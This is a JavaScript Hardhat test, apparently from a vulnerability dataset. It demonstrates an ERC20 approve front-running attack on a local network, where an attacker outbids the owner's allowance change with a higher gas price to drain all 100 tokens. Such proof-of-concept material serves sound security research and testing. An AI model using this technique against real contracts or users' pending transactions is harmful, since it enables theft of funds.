const { loadFixture } = require('@nomicfoundation/hardhat-network-helpers');
const { expect } = require('chai');
const path = require("path");
const fs = require("fs");

describe('attack front_running/ERC20.sol', function () {
    let owner, attacker;
    async function deployContracts() {
      [owner, attacker] = await ethers.getSigners();
      const codePath = path.join(__dirname, '../../artifacts/contracts/dataset/front_running/ERC20.sol/ERC20.json');
      const json = JSON.parse(fs.readFileSync(codePath));
      const ERC20 = await ethers.getContractFactory(json.abi, json.bytecode);
      const victim = await ERC20.connect(owner).deploy(100);  
      return {victim};
    }


    it('front running vulnerability', async function () {
      const {victim} = await loadFixture(deployContracts);

    // owner mistakenly approves the attacker to spend 100 tokens
      await victim.connect(owner).approve(attacker.address, 100);
      const ownerInitialBalance = await victim.balanceOf(owner.address);
      expect(ownerInitialBalance).to.be.equal(100);

      await network.provider.send("evm_setAutomine", [false]);
      await network.provider.send("evm_setIntervalMining", [0]);

      // owner tries to restify the allowance
      const tx1 = await victim.connect(owner).approve(attacker.address, 10, {gasPrice: 767532034});

      // attacker sees tx1's gasPrice and increases its tx gasPrice to become retrieve the tokens before tx1 is mined
      const tx2 = await victim.connect(attacker).transferFrom(owner.address, attacker.address, 100, {gasPrice: 767532040});

      await network.provider.send("hardhat_mine", ["0x2"]);
      await network.provider.send("evm_setAutomine", [true]);

      const ownerBalance = await victim.balanceOf(owner.address);
      expect(ownerBalance).to.be.equal(0);

      const attackerBalance = await victim.balanceOf(attacker.address);
      expect(attackerBalance).to.be.equal(100);
    });


  });